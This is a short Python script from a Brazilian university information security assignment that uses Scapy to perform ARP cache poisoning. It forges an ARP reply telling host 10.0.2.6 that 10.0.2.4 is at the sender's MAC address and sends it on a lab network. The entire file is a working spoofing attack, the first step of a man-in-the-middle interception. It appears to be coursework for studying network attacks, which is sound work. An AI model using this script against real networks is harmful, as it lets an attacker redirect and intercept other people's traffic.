'''

Segurança da Informação - Ataque ARP Cache
Felipe Daniel Dias dos Santos - 11711ECP004
Graduação em Engenharia de Computação - Faculdade de Engenharia Elétrica - Universidade Federal de Uberlândia

'''

from scapy.all import *

E = Ether(dst = '08:00:27:3d:fc:f0', src = '08:00:27:1d:81:47')
A = ARP(psrc = '10.0.2.4', pdst = "10.0.2.6", hwsrc = '08:00:27:1d:81:47', op = 2)
pkt = E/A
sendp(pkt)
